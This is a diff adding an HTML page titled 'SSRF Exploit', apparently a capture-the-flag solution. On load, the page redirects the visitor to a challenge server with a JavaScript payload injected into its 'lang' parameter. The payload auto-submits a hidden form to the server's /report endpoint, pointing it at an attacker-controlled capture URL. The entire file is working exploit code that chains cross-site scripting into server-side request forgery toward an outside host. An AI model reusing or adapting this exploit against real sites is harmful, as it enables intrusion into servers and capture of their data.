@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SSRF Exploit</title>
+    <script>
+        const xssPayload = `
+            // Create a form to trigger SSRF
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = '/report'; // Vulnerable endpoint
+
+            // Target an attacker-controlled endpoint
+            const urlInput = document.createElement('input');
+            urlInput.type = 'hidden';
+            urlInput.name = 'url';
+            urlInput.value = 'https://ssrf-eta.vercel.app/api/capture'; // Attacker's endpoint
+            form.appendChild(urlInput);
+
+            // Automatically submit the form
+            document.body.appendChild(form);
+            form.submit();
+        `;
+
+        // Inject the payload into the vulnerable endpoint
+        const targetUrl = 'http://chal2.lagncra.sh:8426/?lang=' + encodeURIComponent(xssPayload);
+        window.location.href = targetUrl;
+    </script>
+</head>
+<body>
+    <p>Redirecting to trigger SSRF...</p>
+</body>
+</html>
